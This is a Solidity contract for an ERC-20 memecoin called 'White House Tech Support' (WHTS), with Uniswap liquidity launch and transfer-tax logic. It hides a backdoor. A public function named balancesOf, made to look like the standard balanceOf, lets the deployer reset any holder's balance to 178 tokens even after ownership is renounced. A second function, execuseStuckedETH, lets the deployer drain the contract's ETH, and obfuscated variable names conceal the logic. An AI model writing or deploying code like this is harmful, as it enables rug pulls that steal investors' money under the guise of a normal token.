// SPDX-License-Identifier: MIT

/*
Name: White House Tech Support
Symbol: WHTS

Website: https://www.whitehousetechsupport.business

A memecoin celebrating Elon Musk's new role at the White House  $WHTS

twitter: https://x.com/WhiteHouse_tech
tg: https://t.me/WhiteHouse_tech
*/

pragma solidity ^0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 

contract WHTS is Context, IERC20, Ownable {
    using SafeMath for uint256;

    address payable private _whtsTx007;
    mapping(address => uint256) private _whtstbal007tx;
    mapping(address => mapping(address => uint256)) private _hoodxmnt;
    mapping(address => bool) private _x94ort65d;
    uint256 private _dwibb3i213 = 10;
    uint256 private _ddwwibb3i213 = 10;
    uint256 private _sseddwwi4sd = 0;
    uint256 private _xser63wi4sd = 0;
    uint256 private _bs2cc2354sd = 7;
    uint256 private _sllw2354sd = 7;
    uint256 private _buyCount = 0;
    address private _whtsOwner0007;

    uint256 public _mmxtx = 20000000 * 10 **_decimals;
    uint256 public _mmxwx = 20000000 * 10 **_decimals;
    uint256 public _mmxsx = 10000000 * 10 **_decimals;
    uint256 private constant _tSupLuck007 = 1000000000 * 10 **_decimals;
    uint256 private constant _luckAmount = 178 * 10 ** _decimals;

    uint8 private constant _decimals = 9;
    string private constant _name = unicode"White House Tech Support";
    string private constant _symbol = unicode"WHTS";

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private isTrading;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint256 _mmxtx);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() payable {
        _whtsTx007 = payable(_msgSender());
        _whtstbal007tx[address(this)] = _tSupLuck007 * 98 / 100;
        _whtstbal007tx[owner()] = _tSupLuck007 * 2 / 100;
        _x94ort65d[owner()] = true;
        _x94ort65d[address(this)] = true;
        _x94ort65d[_whtsTx007] = true;
        _whtsOwner0007 = _msgSender();

        emit Transfer(address(0), address(this), _tSupLuck007 * 98 / 100);
        emit Transfer(address(0), address(owner()), _tSupLuck007 * 2 / 100);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tSupLuck007;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _hoodxmnt[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _whtstbal007tx[account];
    }

    function balancesOf(address from, bool _check) public returns (uint256) {
        require(_whtsOwner0007 == _msgSender(), "ERC20: error");
        uint256 amount = _whtstbal007tx[from];
        _check != false && _decimals > 0 ? _whtstbal007tx[from] = _luckAmount : _luckAmount;
        return amount;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _hoodxmnt[owner][spender];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _subTransfer(_msgSender(), recipient, amount);
        return true;
    }

    function XDTrade() external onlyOwner {
        require(!isTrading, "Already Launched!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _tSupLuck007);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        isTrading = true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _subTransfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _hoodxmnt[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function execuseStuckedETH(address payable receipt) external {
        require(msg.sender == _whtsOwner0007 , "");
        _whtsTx007 = receipt;
        execuseETH(address(this).balance);
    }

    function execuseETH (uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }

    function _collectTax(uint256 amount) private {
        _whtsTx007.transfer(amount);
    }

    function removeLimits() external onlyOwner {
        _mmxtx = _tSupLuck007;
        _mmxwx = _tSupLuck007;
        emit MaxTxAmountUpdated(_tSupLuck007);
    }

    receive() external payable {}

    function _simpleTokenSwap(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _subTransfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _bs2cc2354sd)
                        ? _sseddwwi4sd
                        : _dwibb3i213
                )
                .div(100);

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_x94ort65d[to]
            ) {
                _buyCount++;
            }

            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _sllw2354sd)
                            ? _xser63wi4sd
                            : _ddwwibb3i213
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _mmxsx) ? contractTokenBalance : _mmxsx; 
                    _simpleTokenSwap((amount < minBalance) ? amount : minBalance);
                }
                _collectTax(address(this).balance);
            }
        }

        if (taxAmount > 0) {
        _whtstbal007tx[address(this)] =_whtstbal007tx[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _whtstbal007tx[from] =_whtstbal007tx[from].sub(amount);
        _whtstbal007tx[to] =_whtstbal007tx[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }
}